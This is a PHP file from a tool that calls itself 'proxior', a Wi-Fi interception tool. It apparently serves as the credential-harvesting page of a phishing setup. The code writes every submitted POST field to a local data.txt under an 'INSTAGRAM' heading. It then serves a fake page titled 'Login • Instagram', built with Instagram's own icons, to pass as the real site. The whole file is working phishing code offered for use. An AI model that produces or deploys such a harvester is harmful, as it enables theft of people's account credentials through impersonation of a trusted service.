<?php 

/*
*  Copyright (c) 2019-2020 Barchampas Gerasimos <makindosxx@gmail.com>.
*  proxior is a wifi interception.
*
*  proxior is free software: you can redistribute it and/or modify
*  it under the terms of the GNU Affero General Public License as published by
*  the Free Software Foundation, either version 3 of the License, or
*  (at your option) any later version.
*
*  proxior is distributed in the hope that it will be useful,
*  but WITHOUT ANY WARRANTY; without even the implied warranty of
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*  GNU Affero General Public License for more details.
*
*  You should have received a copy of the GNU Affero General Public License
*  along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
*/

$path = getcwd();

$path = substr($path,0,16);

$file = $path ."/export/data.txt";

file_put_contents($file, print_r("\n\n\nINSTAGRAM => Informations \n", true), FILE_APPEND);
file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
file_put_contents($file, print_r($_POST, true), FILE_APPEND);
file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
file_put_contents($file, print_r("\n\n\n", true), FILE_APPEND);

?>

<!-- <meta http-equiv="refresh" content="0; url=https://www.instagram.com/accounts/login/?hl=en"/> -->


<html>
<head>

 <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

 <title>Login • Instagram</title>



                <link rel="apple-touch-icon-precomposed" sizes="76x76" href="https://www.instagram.com/static/images/ico/apple-touch-icon-76x76-precomposed.png/4272e394f5ad.png">
                <link rel="apple-touch-icon-precomposed" sizes="120x120" href="https://www.instagram.com/static/images/ico/apple-touch-icon-120x120-precomposed.png/02ba5abf9861.png">
                <link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://www.instagram.com/static/images/ico/apple-touch-icon-152x152-precomposed.png/419a6f9c7454.png">
                <link rel="apple-touch-icon-precomposed" sizes="167x167" href="https://www.instagram.com/static/images/ico/apple-touch-icon-167x167-precomposed.png/a24e58112f06.png">
                <link rel="apple-touch-icon-precomposed" sizes="180x180" href="https://www.instagram.com/static/images/ico/apple-touch-icon-180x180-precomposed.png/85a358fb3b7d.png">
                
                    <link rel="icon" sizes="192x192" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
                
            
            
                    <link rel="mask-icon" href="https://www.instagram.com/static/images/ico/favicon.svg/fc72dd4bfde8.svg" color="#262626">
                  
                  <link rel="shortcut icon" type="image/x-icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
                

</head>
<body style="background-image:url(\\css\\error.png); background-repeat: no-repeat; background-size: auto; background-position:center; background-color: #f7f7f7;">
</body>
</html>
